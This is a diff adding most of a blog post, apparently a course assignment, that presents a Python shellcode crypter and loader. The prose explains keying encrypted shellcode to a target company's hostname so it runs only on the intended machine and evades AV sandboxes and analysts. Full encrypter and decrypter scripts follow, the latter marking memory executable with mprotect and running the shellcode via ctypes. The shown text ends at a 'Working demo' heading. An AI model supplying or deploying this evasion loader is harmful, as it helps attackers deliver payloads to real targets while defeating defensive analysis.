@@ -33,6 +33,172 @@ An **important point** to note is that using this technique we will only be able
 Of course there are workarounds for this too but those are the topics of another discussion.
 
 ## Implementation details
-So we are going to be using a cryptographic library known as NaCl which is an abbreviation for is an abbreviation for "Networking and Cryptography library" as the principal encryption library for our crypter.
+So we are going to be using a cryptographic library known as NaCl which is an abbreviation for "Networking and Cryptography library" as the principal encryption library for our crypter.
 
 Fortunately for us, since this library was created by a very well-known mathematician and cryptographer known as D.J. Bernstein, we do not need to worry about the security or the mathematical backend of this library and we can move on directly with the practical aspects of it.
+
+Moreover, Nacl takes much of the overhead of the process of encryption and authentication in an effort to make it as smooth and painless and error-free as possible through the use of something known as `Secret Box`.
+
+NaCl uses the following algorithms for symmetric encryption and authentication respectively:
+
+1. Salsa20
+1. Poly1305
+
+We are going to be using a Python module known as `PyNaCl` to use this library in Python for this assignment and it can be installed via `pip`.
+
+There's not much to explain about the encryption/decryption process since it's pretty self-explanatory and the developers of this Python module have done a got job explaining it and creating a wonderfully detailed documentation.
+Have a look at it [here](https://pynacl.readthedocs.io/en/stable/).
+
+Also my code is beautifully commented to clear any doubts that might arise ;)
+
+### Environmental Keying for shellcode security
+One last thing I want to mention before we jump into the code is a feature that I am quite proud of.
+
+So instead of using an encryption passphrase from the user and hardcoding that same passphrase in the stub to decrypt the shellcode at run-time what I have done is known as ***environmental keying***.
+
+Suppose I am targeting a company, I would first do my recce and find out the hostname used by machines in their network. Next I am going to encrypt my shellcodes using that hostname and then begin delivery of the payload.
+At runtime, the stub dynamically retrieves the hostname of the computer it is being executed upon and tries to decrypt the shellcode using that hostname as passphrase.
+
+The benefits of doing this are that if the current environment is the intended target for the shellcode only then the shellcode would execute otherwise decryption and ultimately execution would fail. 
+
+This is crucial because you as a red-teamer/pen-tester obviously do not want your shellcode to execute on a blue-teamer/AVs simulated malware analysis environment where it will either determine it's nature or dissect and reverse-engineer your payload which can't be any good.
+
+Keep in mind that I have used the hostname here as an example only and in real-life there can be many factors that an operator might use as an environmental keying factor to determine friend-or-foe.
+
+## Encrypter Code
+The crypter code is as follows:
+
+```python
+# Filename: shellcode_crypter.py
+# Author: Upayan a.k.a. slaeryan
+# SLAE: 1525
+# Contact: upayansaha@icloud.com
+# Purpose: This is a Python3 script to encrypt a shellcode using a target hostname
+# which alongwith the shellcode hex string is fed into the program and it spits out
+# an encrypted shellcode encrypted for the target environment.
+# Usage: python3 shellcode_crypter.py
+# Note: PyNaCl library has been used for encryption. Also note that the 
+# hostname is used as a passphrase to encrypt the shellcode.
+# Testing: python3 shellcode_decrypter_loader.py
+
+
+import socket
+import nacl.secret
+import nacl.utils
+import nacl.pwhash
+import base64
+
+
+salt = b"\xb5\xbe\x95\x7fL\x84%\xd70\xbb\xe7\x19]\xf8\x9cT" # Generate a random 16 bytes salt
+
+
+def main():
+    # Display author
+    print("Author: Upayan a.k.a slaeryan\n")
+    # Display purpose
+    print("Purpose: This is a Python3 script to encrypt a shellcode using a target hostname which alongwith the shellcode is fed into the program and it spits out an encrypted shellcode encrypted for the target environment.\n")
+    # Obtain the passphrase
+    hostname = input("[+] Enter the target hostname: ")
+    print("\n")
+    passphrase = hostname.encode("utf-8")
+    # Key Derivation Function
+    kdf = nacl.pwhash.argon2i.kdf
+    # Generate the key
+    key = kdf(nacl.secret.SecretBox.KEY_SIZE, passphrase, salt)
+    # Input the plaintext from the user
+    plaintext = input("[+] Enter the Original Shellcode hex string: ")
+    # Create a SecretBox for encryption
+    box = nacl.secret.SecretBox(key)
+    # Encode the plaintext for encryption
+    plaintext_byte = plaintext.encode("utf-8")
+    # Encrypt the plaintext message
+    ciphertext_byte = box.encrypt(plaintext_byte)
+    # Cipher text will be 40 bytes longer than plaintext - MAC + Nonce
+    assert len(ciphertext_byte) == len(plaintext_byte) + box.NONCE_SIZE + box.MACBYTES
+    # Decode the cipher text for display
+    ciphertext = base64.b64encode(ciphertext_byte).decode("utf-8")
+    # Display the cipher text
+    print("\n")
+    print("[+] Encrypted Shellcode: ", ciphertext)
+    print("\n")
+
+
+main()
+```
+
+## Decrypter Code
+The decrypter code is as follows:
+
+```python
+# Filename: shellcode_decrypter.py
+# Author: Upayan a.k.a. slaeryan
+# SLAE: 1525
+# Contact: upayansaha@icloud.com
+# Purpose: This is a Python3 script to decrypt an encrypted shellcode which is 
+# fed into the program by the user and it executes the shellcode iff it was encrypted
+# for the target environment(hostname).
+# Usage: python3 shellcode_decrypter_loader.py
+# Note: PyNaCl library has been used for decryption. Also note that the 
+# hostname is used as a passphrase to decrypt the shellcode and execute it.
+
+
+import socket
+import nacl.secret
+import nacl.utils
+import nacl.pwhash
+import base64
+import sys
+from ctypes import *
+
+
+salt = b"\xb5\xbe\x95\x7fL\x84%\xd70\xbb\xe7\x19]\xf8\x9cT" # Use the same salt as used for encryption
+
+
+def main():
+    # Display author
+    print("Author: Upayan a.k.a slaeryan\n")
+    # Display purpose
+    print("Purpose: This Python3 script is used to decrypt a shellcode using PyNaCl library using the encrypted shellcode which is fed as input   and the current hostname is fetched as passphrase and then executes the shellcode iff it was encrypted for the target environment.\n")
+    # Obtain the passphrase
+    hostname = socket.gethostname()
+    passphrase = hostname.encode("utf-8")
+    # Key Derivation Function
+    kdf = nacl.pwhash.argon2i.kdf
+    # Generate the key
+    key = kdf(nacl.secret.SecretBox.KEY_SIZE, passphrase, salt)
+    # Input the cipher text from the user
+    ciphertext = input("[+] Enter the Encrypted Shellcode: ")
+    # Encode the cipher text for decryption
+    ciphertext_byte = base64.b64decode(ciphertext)
+    # Create a SecretBox for decryption
+    box = nacl.secret.SecretBox(key)
+    # Try to decrypt the cipher text
+    try:
+        plaintext_byte = box.decrypt(ciphertext_byte)
+    except:
+        print("\n")
+        print("[-] Decryption failed! Shellcode not meant for target environment!\n")
+        sys.exit(0)
+    # Decode the plaintext message for operations
+    plaintext = plaintext_byte.decode("utf-8")
+    # Display the plain text
+    print("\n")
+    print("[+] Original Shellcode: ", plaintext)
+    print("\n")
+    # Executing the shellcode now
+    shellcode = bytes.fromhex(plaintext)
+    libC = CDLL('libc.so.6')
+    code = c_char_p(shellcode)
+    sizeofshellcode = len(shellcode)
+    memAddrPointer = c_void_p(libC.valloc(sizeofshellcode))
+    codeMovePointer = memmove(memAddrPointer, code, sizeofshellcode)
+    protectMemory = libC.mprotect(memAddrPointer, sizeofshellcode, 7)
+    run = cast(memAddrPointer, CFUNCTYPE(c_void_p))
+    print('[+] Now executing shellcode ...')
+    run()
+
+
+main()
+```
+
+## Working demo of Crypter
